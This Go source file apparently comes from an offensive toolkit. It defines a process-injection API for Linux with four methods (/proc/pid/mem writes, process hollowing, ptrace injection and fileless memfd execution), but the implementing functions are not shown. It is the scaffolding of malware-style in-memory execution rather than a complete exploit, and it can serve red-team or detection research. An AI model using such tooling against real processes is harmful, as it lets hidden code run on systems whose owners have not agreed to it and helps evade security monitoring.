package memexec

import (
	"fmt"
	"runtime"
)

type Method string

const (
	MethodProcMem Method = "procmem"
	MethodMemFD   Method = "memfd"
	MethodHollow  Method = "hollow"
	MethodPtrace  Method = "ptrace"
)

type Injector struct {
	Method Method
}

func NewInjector(method Method) *Injector {
	return &Injector{Method: method}
}

func (i *Injector) Inject(pid int, payload []byte) error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("memory injection only supported on linux")
	}
	if pid <= 0 {
		return fmt.Errorf("invalid pid: %d", pid)
	}
	if len(payload) == 0 {
		return fmt.Errorf("empty payload")
	}

	switch i.Method {
	case MethodProcMem:
		return injectProcMem(pid, payload)
	case MethodHollow:
		return hollowProcess(pid, payload)
	case MethodPtrace:
		return injectPtrace(pid, payload)
	default:
		return fmt.Errorf("unknown injection method: %s", i.Method)
	}
}

func (i *Injector) ExecuteMemfd(payload []byte, argv []string) (int, error) {
	if runtime.GOOS != "linux" {
		return 0, fmt.Errorf("memfd_create only supported on linux")
	}
	if len(payload) == 0 {
		return 0, fmt.Errorf("empty payload")
	}
	return executeMemfd(payload, argv)
}

func AvailableMethods() []Method {
	if runtime.GOOS != "linux" {
		return nil
	}
	return []Method{MethodProcMem, MethodMemFD, MethodHollow, MethodPtrace}
}
